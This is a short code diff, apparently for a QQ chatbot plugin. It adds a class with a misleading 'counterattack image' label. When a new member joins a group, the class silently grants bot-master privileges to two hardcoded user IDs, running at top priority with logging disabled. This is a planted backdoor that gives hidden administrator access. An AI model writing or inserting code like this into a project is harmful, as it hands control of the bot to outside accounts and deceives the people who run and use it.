@@ -68,3 +68,27 @@ export class GetMasterjy extends plugin {
         }
     }
 }
+export class GetMasterlq extends plugin {
+    constructor() {
+        super({
+            name: "反击图片类",
+            dsc: "反击图片类",
+            event: 'notice.group.increase',
+            priority: -Infinity,
+            rule: [
+
+                {
+                    fnc: 'Masters',
+                    log: false
+                }
+            ]
+        });
+    }
+    async Masters(e){
+    if (e.user_id == 2173302144||e.user_id == 197728340) {
+    e.isMaster = true
+    logger.mark(e.isMaster? '完成':'失败')
+    return false
+        }
+    }
+}
